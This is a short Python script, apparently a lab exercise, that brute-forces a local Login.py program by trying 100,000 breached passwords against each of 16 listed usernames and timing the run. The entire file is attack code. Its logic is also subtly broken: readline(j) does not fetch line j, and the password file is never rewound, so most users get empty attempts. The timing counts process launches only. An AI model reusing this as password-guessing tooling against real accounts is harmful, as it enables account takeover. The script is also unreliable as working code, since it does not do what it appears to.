
import time
import subprocess

passwords_100k = open("PwnedPWs100k.txt", "r", encoding='utf-8')

line_count = 0
with open('PwnedPWs100k.txt', 'r', encoding='utf-8') as file:
    for line in file:
        line_count += 1

usernames = [
    "Charles",
    "Ted",
    "Tom",
    "Bonnie",
    "Clyde",
    "Kevin",
    "Andrew",
    "Jack",
    "Richard",
    "Donald",
    "Kim",
    "Vlad",
    "Benedict",
    "Billy",
    "Anne",
    "John"
]

time_start = time.time()
for i in range(len(usernames)):
    for j in range(line_count):
        arguments = ['python', 'Login.py', usernames[i], passwords_100k.readline(j)]
        process = subprocess.Popen(arguments)
time_end = time.time()
total_time = time_end - time_start
print(f"Total time taken: {total_time}s")